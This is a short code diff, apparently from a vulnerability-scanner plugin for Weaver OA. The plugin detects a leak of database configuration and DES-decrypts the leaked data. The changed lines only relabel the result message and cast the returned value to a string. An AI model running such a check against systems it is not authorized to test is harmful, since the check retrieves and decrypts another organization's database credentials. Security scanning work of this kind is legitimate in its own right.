@@ -68,11 +68,11 @@ def medusa(Url,RandomAgent,ProxyIp):
         if code == 200 and resp.headers['Content-Type']=='text/html; charset=UTF-8' and resph.find('ecology') != -1 and len(con)>20:
             k = pyDes.des(key, pyDes.ECB, '\0' * 8, pad=None, padmode=pyDes.PAD_PKCS5)
             decs=k.decrypt(dec)
-            Medusa = "{} 验证数据:\r\nUrl:{}\r\n返回数据:{}\r\n解密数据:{}".format(url,payload_url,con,decs)
+            Medusa = "{} 存在泛微OA_数据库配置信息泄露验证数据:\r\nUrl:{}\r\n返回数据:{}\r\n解密数据:{}".format(url,payload_url,con,decs)
             _t=VulnerabilityInfo(Medusa)
             web=ClassCongregation.VulnerabilityDetails(_t.info)
             web.Intermediate() # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
-            return (_t.info)
+            return (str(_t.info))
     except:
         _ = VulnerabilityInfo('').info.get('algroup')
         _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类
